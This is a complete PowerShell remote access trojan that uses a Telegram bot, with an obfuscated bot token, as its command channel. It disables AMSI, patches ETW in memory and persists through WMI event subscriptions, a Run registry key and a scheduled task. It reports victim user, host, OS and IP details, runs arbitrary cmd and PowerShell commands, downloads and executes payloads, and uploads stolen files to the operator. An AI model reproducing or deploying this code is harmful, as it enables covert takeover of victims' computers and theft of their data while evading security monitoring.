# Obfuscated strings - decode at runtime
function d([string]$s){[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))}

$BtTkn = d('MjE0MzA0MzczMjpBQUsxTkw5NnU0S2lad0F3UTJKSFJJLUU0YmpLQklCZzZpZWs=')  # Your token B64
$OnrId = d('NjcyMjY5NzAz') -as [int]  # Owner ID B64'd

$glbl:MchId = $null
$glbl:HrtBtInt = 300 + (Get-Random -Max 60)  # Jitter
$glbl:PolDly = 1 + (Get-Random -Max 3)
$glbl:ScPt = $MyInvocation.MyCommand.Path

# Win32 for patching only
$Wn32 = @"
using System;
using System.Runtime.InteropServices;

public class Wn32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Wn32 -ErrorAction SilentlyContinue

function BypAmsi {
    try {
        # NEW: Check PowerShell version (AMSI not in v2, e.g., Win7 default)
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $a = [String]::Join('', (d('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=').ToCharArray() | Sort-Object {Get-Random}))
            $b = [String]::Join('', (d('YW1zaUluaXRGYWlsZWQ=').ToCharArray() | Sort-Object {Get-Random}))
            $t = [Ref].Assembly.GetType($a)
            $f = $t.GetField($b, 'NonPublic,Static')
            $f.SetValue($null, $true)
        }
    } catch { }
}

function BypEtw {
    try {
        $Ll = [Wn32]::LoadLibrary((d('bnRkbGwuZGxs')))  # ntdll.dll
        $Adr = [Wn32]::GetProcAddress($Ll, (d('RXR3RXZlbnRXcml0ZQ==')))  # EtwEventWrite
        if ([IntPtr]::Zero -eq $Adr) { return }
        $is64Bit = [Environment]::Is64BitProcess  # NEW: More reliable than env var
        $Ptch = if ($is64Bit) { [Byte[]](0xC2, 0x14, 0x00) } else { [Byte[]](0xC3) }  # RET 20 for x64 stack clean; RET for x86
        $patchSize = [UIntPtr]($Ptch.Length)
        $p = 0
        [Wn32]::VirtualProtect($Adr, $patchSize, 0x40, [ref]$p)
        $new = [System.Runtime.InteropServices.Marshal]
        $new::Copy($Ptch, 0, $Adr, $Ptch.Length)
    } catch { }
}

function Escape-PathForCmd {
    param([string]$Path)
    return $Path -replace '"', '""'
}

function StPrstnc {
    # Escape path for WMI and cmd
    $escapedScPt = Escape-PathForCmd $glbl:ScPt
    $WmiAct = "powershell -ep By -w H -f `"$escapedScPt`""

    # NEW: Check admin status for privilege-aware persistence
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin) {
        # NEW: Check for existing WMI persistence to avoid duplicates
        $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='UpdaterFilter'" -ErrorAction SilentlyContinue
        if (-not $existingFilter) {
            $WmiQ = "SELECT * FROM Win32_LogonSession WHERE LogonType = 2"
            $WmiNs = [wmiclass]"root\subscription:__EventFilter"
            $Flt = $WmiNs.CreateInstance()
            $Flt.Name = (d('VXBkYXRlckZpbHRlcg=='))
            $Flt.Query = $WmiQ
            $Flt.QueryLanguage = "WQL"
            $Flt.EventNamespace = "root\cimv2"
            $Flt.Put() | Out-Null
        }

        $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='UpdaterConsumer'" -ErrorAction SilentlyContinue
        if (-not $existingConsumer) {
            $Cons = [wmiclass]"root\subscription:CommandLineEventConsumer".CreateInstance()
            $Cons.Name = (d('VXBkYXRlckNvbnN1bWVy'))
            $Cons.CommandLineTemplate = $WmiAct
            $Cons.Put() | Out-Null
        }

        $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter.__Path LIKE '%UpdaterFilter%'" -ErrorAction SilentlyContinue
        if (-not $existingBinding) {
            $WmiBnd = [wmiclass]"root\subscription:__FilterToConsumerBinding"
            $Bnd = $WmiBnd.CreateInstance()
            $Bnd.Filter = $Flt
            $Bnd.Consumer = $Cons
            $Bnd.Put() | Out-Null
        }
    }

    # NEW: Fallback persistence (registry/task) with duplicate checks
    $rNm = "SysHlpr$(Get-Random -Max 999)"
    $rPth = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $escapedRegVal = "powershell -ep By -w H -f `"$escapedScPt`""
    $existingReg = Get-ItemProperty -Path $rPth -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "SysHlpr*" }
    if (-not $existingReg) {
        Set-ItemProperty -Path $rPth -Name $rNm -Value $escapedRegVal -ErrorAction SilentlyContinue
    }

    if ($isAdmin) {
        $tNm = "SysUpdTsk$(Get-Random -Max 999)"
        $existingTask = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "SysUpdTsk*" }
        if (-not $existingTask) {
            $taskCmd = "schtasks /create /tn $tNm /tr `"$escapedRegVal`" /sc onlogon /rl highest /f"
            Invoke-Expression $taskCmd -ErrorAction SilentlyContinue
        }
    }
}

function RmPrstnc {
    # Clean WMI
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*Updater*"} | ForEach-Object { $_.Delete() }
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {$_.Filter -like "*Updater*"} | ForEach-Object { $_.Delete() }
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*Updater*"} | ForEach-Object { $_.Delete() }

    # Fallback
    $rPth = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path $rPth -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object {$_.Name -like "*SysHlpr*"} | ForEach-Object { 
        Remove-ItemProperty -Path $rPth -Name $_.Name -ErrorAction SilentlyContinue 
    }
    Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.TaskName -like "*SysUpdTsk*"} | ForEach-Object { 
        schtasks /delete /tn $_.TaskName /f 2>$null 
    }

    $idFl = "$env:USERPROFILE\.shl_id"
    if (Test-Path $idFl) { Remove-Item $idFl -Force -ErrorAction SilentlyContinue }
    $lgFl = "$env:TEMP\shl.lg"
    if (Test-Path $lgFl) { Remove-Item $lgFl -Force -ErrorAction SilentlyContinue }

    Get-Job | Stop-Job -ErrorAction SilentlyContinue
    Get-Job | Remove-Job -ErrorAction SilentlyContinue
    exit 0
}

function GtMchId {
    $glbl:MchId = $null
    $idFl = "$env:USERPROFILE\.shl_id"
    if (Test-Path $idFl) {
        $glbl:MchId = Get-Content $idFl -ErrorAction SilentlyContinue
    } else {
        $rnd = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 8 | ForEach {[char]$_})
        $glbl:MchId = "$env:COMPUTERNAME`_$rnd"
        $glbl:MchId | Out-File $idFl -Force -ErrorAction SilentlyContinue
    }
}

function SdStupPng {
    $mrk = @{ inline_keyboard = @(@{ text = d('U2hvd0NtZHM='); callback_data = d('c2hvd19jbWRz') }) }
    $ip = (Invoke-RestMethod -Uri d('aHR0cHM6Ly9hcGkuaXBpZnkub3Jn') -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue).Trim()
    $inf = (d('U2hlbGwgb25saW5lIQ==') ) + "`n`nUser: $($env:USERNAME)`nPC: $($env:COMPUTERNAME)`nOS: $([System.Environment]::OSVersion.VersionString)`nIP: $ip`nID: <b>$glbl:MchId</b>"
    $bd = @{ chat_id = $OnrId; text = $inf; parse_mode = "HTML"; reply_markup = (ConvertTo-Json $mrk -Depth 3) } | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn" + d('L3NlbmRNZXNzYWdl')) -Method Post -Body $bd -ContentType 'application/json' -TimeoutSec 10 -ErrorAction SilentlyContinue
}

function StHrtbt {
    $hbtJb = {
        while ($true) {
            $uptm = [math]::Round((Get-Date) - (Get-Process -Id $PID).StartTime).TotalMinutes
            $ctr = Get-Counter '\Processor(_Total)\% Processor Time' -ErrorAction SilentlyContinue
            $cpu = if($ctr -and $ctr.CounterSamples){ $ctr.CounterSamples.CookedValue } else { 0 }
            $stts = (d('8J+PgSBIZSBTaGVsbCBIZWFydGJlYXQ=') ) + " | ID: $glbl:MchId | Uptime: $uptm mins | CPU: $($cpu.ToString('F1'))% | Online"
            $bd = @{ chat_id = $OnrId; text = $stts } | ConvertTo-Json
            Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn" + d('L3NlbmRNZXNzYWdl')) -Method Post -Body $bd -ContentType 'application/json' -TimeoutSec 10 -ErrorAction SilentlyContinue
            Start-Sleep ($glbl:HrtBtInt + (Get-Random -Max 30))
        }
    }
    Start-Job -ScriptBlock $hbtJb -Name "Hrtbt" -ErrorAction SilentlyContinue
}

function InvDl {
    param($url, $path, $exec, $tgtId)
    if ($tgtId -and $tgtId.ToLower() -ne $glbl:MchId.ToLower()) { return }
    try {
        bitsadmin /transfer "Jb$(Get-Random)" /download /priority normal "`"$url`"" "`"$path`"" > $null  # Quotes for spaces
        if ($exec -and (Test-Path $path)) {
            Start-Process $path -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
        $rply = "Dl'd to $path" + ($exec ? " & exec'd." : ".")
        SdRply $rply
    } catch {
        SdRply "Dl err: $($_.Exception.Message)"
    }
}

function InvUl {
    param($path, $tgtId)
    if ($tgtId -and $tgtId.ToLower() -ne $glbl:MchId.ToLower()) { return }
    if (-not (Test-Path $path)) {
        SdRply "Fl not fnd: $path"
        return
    }
    try {
        $file = Get-Item $path -ErrorAction SilentlyContinue
        if ($file.Length -gt 45MB) {
            SdRply "Fl > 45MB limit"
            return
        }
        $form = @{ chat_id = $OnrId; document = Get-Item $path }
        Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn" + d('L3NlbmREb2N1bWVudA==')) -Method Post -Form $form -TimeoutSec 60 -ErrorAction SilentlyContinue
    } catch {
        SdRply "Ul err: $($_.Exception.Message)"
    }
}

function SdRply {
    param($text, $msgId)
    try {
        $bd = @{ chat_id = $OnrId; text = $text }
        if ($msgId) { $bd.reply_to_message_id = $msgId }
        $bdJs = $bd | ConvertTo-Json
        Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn" + d('L3NlbmRNZXNzYWdl')) -Method Post -Body $bdJs -ContentType 'application/json' -TimeoutSec 10 -ErrorAction SilentlyContinue
    } catch { }
}

# NEW: Enhanced argument parser for robustness
function Parse-Args {
    param([string]$InputString)
    $args = @()
    $current = ""
    $inQuote = $false
    $escapeNext = $false

    # NEW: Handle null/empty input
    if ([string]::IsNullOrWhiteSpace($InputString)) { return @() }

    for ($i = 0; $i -lt $InputString.Length; $i++) {
        $char = $InputString[$i]
        
        if ($escapeNext) {
            $current += $char
            $escapeNext = $false
            continue
        }
        
        if ($char -eq '\') {
            $escapeNext = $true
            continue
        }
        
        if ($char -eq '"') {
            $inQuote = -not $inQuote
            continue
        }
        
        if ($char -match '\s' -and -not $inQuote) {
            if ($current -ne "") {
                $args += $current
                $current = ""
            }
            continue
        }
        
        $current += $char
    }
    
    if ($current -ne "") {
        $args += $current
    }
    
    # NEW: Handle unclosed quotes gracefully
    if ($inQuote) {
        $args[$args.Length - 1] = $current.TrimEnd('"')
    }
    
    return $args
}

function StPol {
    $off = 0
    $bck = $glbl:PolDly
    while ($true) {
        try {
            $uri = ("https://api.telegram.org/bot$BtTkn" + d('L2dldFVwZGF0ZXM=')) + "?offset=$off&timeout=10"
            $upds = Invoke-RestMethod -Uri $uri -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
            if (-not $upds.result) { Start-Sleep $bck; continue }
            $bck = $glbl:PolDly

            foreach ($upd in $upds.result) {
                $off = $upd.update_id + 1
                # Handle callback_query for button
                if ($upd.callback_query -and $upd.callback_query.data -eq 'show_cmds') {
                    $cq = $upd.callback_query
                    $cmdsMsg = @{chat_id=$cq.message.chat.id; text="Commands: /cmd <cmd>, /ps <ps>, /download <url> <path> [exec] [ID], etc."; reply_to_message_id=$cq.message.message_id} | ConvertTo-Json
                    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn/sendMessage") -Method Post -Body $cmdsMsg -ContentType 'application/json' -ErrorAction SilentlyContinue
                    $ansCb = @{callback_query_id=$cq.id} | ConvertTo-Json
                    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn/answerCallbackQuery") -Method Post -Body $ansCb -ContentType 'application/json' -ErrorAction SilentlyContinue
                    continue
                }
                $msg = $upd.message
                if (-not $msg -or $msg.from.id -ne $OnrId) { continue }

                $txt = $msg.text
                if (-not $txt.StartsWith('/')) { continue }

                # NEW: Improved command parsing
                if ($txt -match '^/(\w+)\s*(.*)$') {
                    $cmdNm = $matches[1].ToLower()
                    $fullCmd = $matches[2].Trim()
                } else {
                    $cmdNm = $txt.Substring(1).ToLower()
                    $fullCmd = ''
                }
                $args = Parse-Args $fullCmd

                $tgtId = $null
                if ($args.Count -gt 0) {
                    $potId = $args[-1]
                    if ($potId -and $potId.ToLower() -eq $glbl:MchId.ToLower()) {
                        $tgtId = $potId
                        $args = $args[0..($args.Count-2)]
                        $fullCmd = ($args -join ' ')
                    }
                }

                if ($tgtId -and $tgtId.ToLower() -ne $glbl:MchId.ToLower()) { continue }

                if ($cmdNm -eq d('a2lsbA==')) {  # kill
                    RmPrstnc
                    continue
                }

                if ($cmdNm -eq d('ZG93bmxvYWQ=')) {  # download
                    if ($args.Length -lt 2) {
                        SdRply (d('VXNhZ2U6IC9kb3dubG9hZCA8dXJsPiA8cGF0aD4gW2V4ZWNdIFtJRF0=')) $msg.message_id
                        continue
                    }
                    $url = $args[0]
                    $path = $args[1]
                    $exec = $args.Count -gt 2 -and $args[2] -eq "exec"
                    InvDl $url $path $exec $tgtId
                    continue
                }

                if ($cmdNm -eq d('dXBsb2Fk')) {  # upload
                    if (-not $args) {
                        SdRply (d('VXNhZ2U6IC91cGxvYWQgPHBhdGg+IFtJRF0=')) $msg.message_id
                        continue
                    }
                    $path = $args[0]
                    InvUl $path $tgtId
                    continue
                }

                if ($cmdNm -eq d('bGlzdF9tYWNoaW5lcw==')) {  # list_machines
                    $uptm = [math]::Round((Get-Date) - (Get-Process -Id $PID).StartTime).TotalMinutes
                    $lstMsg = (d('U2hlbGwg')) + "$glbl:MchId $(d('cmVwb3J0aW5nOg==')) Online | PC: $env:COMPUTERNAME | Uptime: $uptm mins"
                    SdRply $lstMsg $msg.message_id
                    continue
                }

                if ($cmdNm -eq d('Y21k')) {  # cmd
                    $tmpOt = "$env:TEMP\cmd_ot$(Get-Random).txt"
                    $tmpEr = "$env:TEMP\cmd_er$(Get-Random).txt"
                    $prcs = Start-Process cmd.exe -ArgumentList @('/c', $fullCmd) -WindowStyle Hidden -PassThru -RedirectStandardOutput $tmpOt -RedirectStandardError $tmpEr -Wait -NoNewWindow -ErrorAction SilentlyContinue
                    
                    $otpt = Get-Content $tmpOt -Raw -ErrorAction SilentlyContinue
                    $errOt = Get-Content $tmpEr -Raw -ErrorAction SilentlyContinue
                    $cmbnd = if ($otpt) { $otpt } else { $errOt }
                    
                    if ($cmbnd) {
                        $cmbnd = $cmbnd.Trim()
                        if ($cmbnd.Length -gt 3500) {
                            $cmbnd = $cmbnd.Substring(0, 3500) + "`n... (trunc)"
                        }
                        $rply = (d('T3V0cHV0Og==')) + "`n```$cmbnd```"
                        $bd = @{ chat_id = $OnrId; text = $rply; parse_mode = "Markdown"; reply_to_message_id = $msg.message_id } | ConvertTo-Json
                    } else {
                        $rply = d('RXhlYy1ubyBvdXQ=')
                        $bd = @{ chat_id = $OnrId; text = $rply; reply_to_message_id = $msg.message_id } | ConvertTo-Json
                    }
                    
                    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn" + d('L3NlbmRNZXNzYWdl')) -Method Post -Body $bd -ContentType 'application/json' -TimeoutSec 10 -ErrorAction SilentlyContinue
                    Remove-Item $tmpOt, $tmpEr -Force -ErrorAction SilentlyContinue
                    continue
                }

                if ($cmdNm -eq d('cHM=')) {  # ps
                    $tmpOt = "$env:TEMP\ps_ot$(Get-Random).txt"
                    $tmpEr = "$env:TEMP\ps_er$(Get-Random).txt"
                    # NEW: Embed bypasses with version check for compatibility
                    $bypassCode = @"
if (`$PSVersionTable.PSVersion.Major -ge 3) {
    function BypAmsi {
        try {
            `$a = [String]::Join('', ('$($a)' | Sort-Object {Get-Random}))
            `$b = [String]::Join('', ('$($b)' | Sort-Object {Get-Random}))
            `$t = [Ref].Assembly.GetType(`$a)
            `$f = `$t.GetField(`$b, 'NonPublic,Static')
            `$f.SetValue(`$null, `$true)
        } catch { }
    }
} else {
    function BypAmsi {}
}
function BypEtw {
    try {
        `$Ll = [Wn32]::LoadLibrary('$($Ll)')  # ntdll.dll
        `$Adr = [Wn32]::GetProcAddress(`$Ll, '$($Adr)')  # EtwEventWrite
        if ([IntPtr]::Zero -eq `$Adr) { return }
        `$is64Bit = [Environment]::Is64BitProcess
        `$Ptch = if (`$is64Bit) { [Byte[]](0xC2, 0x14, 0x00) } else { [Byte[]](0xC3) }
        `$patchSize = [UIntPtr]($($Ptch.Length))
        `$p = 0
        [Wn32]::VirtualProtect(`$Adr, `$patchSize, 0x40, [ref]`$p)
        `$new = [System.Runtime.InteropServices.Marshal]
        `$new::Copy(`$Ptch, 0, `$Adr, `$Ptch.Length)
    } catch { }
}
Add-Type @'
using System;
using System.Runtime.InteropServices;

public class Wn32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
'@ -ErrorAction SilentlyContinue
BypAmsi
BypEtw
$fullCmd
"@
                    $psArgs = @('-ep', 'Bypass', '-w', 'Hidden', '-c', $bypassCode)
                    $prcs = Start-Process powershell.exe -ArgumentList $psArgs -WindowStyle Hidden -PassThru -RedirectStandardOutput $tmpOt -RedirectStandardError $tmpEr -Wait -NoNewWindow -ErrorAction SilentlyContinue
                    
                    $otpt = Get-Content $tmpOt -Raw -ErrorAction SilentlyContinue
                    $errOt = Get-Content $tmpEr -Raw -ErrorAction SilentlyContinue
                    $cmbnd = if ($otpt) { $otpt } else { $errOt }
                    
                    if ($cmbnd) {
                        $cmbnd = $cmbnd.Trim()
                        if ($cmbnd.Length -gt 3500) {
                            $cmbnd = $cmbnd.Substring(0, 3500) + "`n... (trunc)"
                        }
                        $rply = (d('UVMgT3V0cHV0Og==')) + "`n```$cmbnd```"
                        $bd = @{ chat_id = $OnrId; text = $rply; parse_mode = "Markdown"; reply_to_message_id = $msg.message_id } | ConvertTo-Json
                    } else {
                        $rply = d('RXhlYy1ubyBvdXQ=') 
                        $bd = @{ chat_id = $OnrId; text = $rply; reply_to_message_id = $msg.message_id } | ConvertTo-Json
                    }
                    
                    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$BtTkn" + d('L3NlbmRNZXNzYWdl')) -Method Post -Body $bd -ContentType 'application/json' -TimeoutSec 10 -ErrorAction SilentlyContinue
                    Remove-Item $tmpOt, $tmpEr -Force -ErrorAction SilentlyContinue
                    continue
                }

                if ($cmdNm -eq d('aGVscA==')) {  # help
                    $hlpArgs = $args
                    if (-not $hlpArgs) {
                        $hlpTxt = d('Q21kczogL2NtZCA8Y21kPiwgL3BzIDxwc3MsIC9kb3dubG9hZCA8dXJsPiA8cGF0aD4gW2V4ZWNdLCAvdXBsb2FkIDxwYXRoPiwgL2tpbGwsIC9oZWxwIDxjbWQ+LCAvY29tbWFuZHMsIC9saXN0X21hY2hpbmVzLg==')
                        SdRply $hlpTxt $msg.message_id
                        continue
                    }
                    $subCmd = $hlpArgs[0].ToLower()
                    $hlps = @{
                        d('Y21k') = d('RXhlYyBDTUQ6IC9jbWQgd2hvYW1pIFtJRF0=')
                        d('cHM=') = d('RXhlYyBQUyAoYnlwYXNzZWQ6IC9wcyBHZXQtUHJvY2VzcyBbSUQ=') 
                        d('ZG93bmxvYWQ=') = d('RmV0Y2ggZmlsZTogL2Rvd25sb2FkIFtVUkxdIFtQQVRIXSBbZXhlY10gW0lEXQ==')
                        d('dXBsb2Fk') = d('RXhmaWwgZmlsZTogL3VwbG9hZCBbUEFUSA0KWy9JRF0=') 
                        d('a2lsbA==') = d('VGVybWluYXRlIHNoZWxsOiAva2lsbCBbSUQ=') 
                        d('bGlzdF9tYWNoaW5lcw==') = d('RmxlZXQgc3RhdHVzLg==')
                    }
                    $rply = $hlps[$subCmd] ?? d('Q21kIG5vdCBmb3VuZC0vaGVscCA8Y21kPi4=')
                    SdRply $rply $msg.message_id
                    continue
                }

                if ($cmdNm -eq d('Y29tbWFuZHM=')) {  # commands
                    $lst = d('Q21kczoKCi9jbWQgLSBDTUQgZXhlYwpwcwogLSBQUyBleGVjIChieXBhc3NlZCkKL2Rvd25sb2FkIDx1cmwgPiA8cGF0aD4gW2V4ZWNdIC0gRmV0Y2ggJiBydW4KL3VwbG9hZCA8cGF0aD4gLSBFeGZpbCBmaWxlCi9raWxsIC0gU2VsZi10ZXJtaW5hdGUKL2hlbHAgPGNtZD4gLSBEZXRhaWxzCi9jb21tYW5kcyAtIFRoaXMKL2xpc3RfbWFjaGluZXMgLSBGbGVldA==')
                    SdRply $lst $msg.message_id
                    continue
                }
            }
        } catch {
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
                $rtryAft = [int]($_.Exception.Response.Headers['Retry-After'] ?? 60)
                Start-Sleep $rtryAft
                $bck = $rtryAft
            } else {
                Start-Sleep $bck
                $bck = [Math]::Min($bck * 2, 300)
            }
        }
        Start-Sleep ($glbl:PolDly + (Get-Random -Max 2))
    }
}

BypAmsi
BypEtw
StPrstnc
GtMchId
SdStupPng
StHrtbt
StPol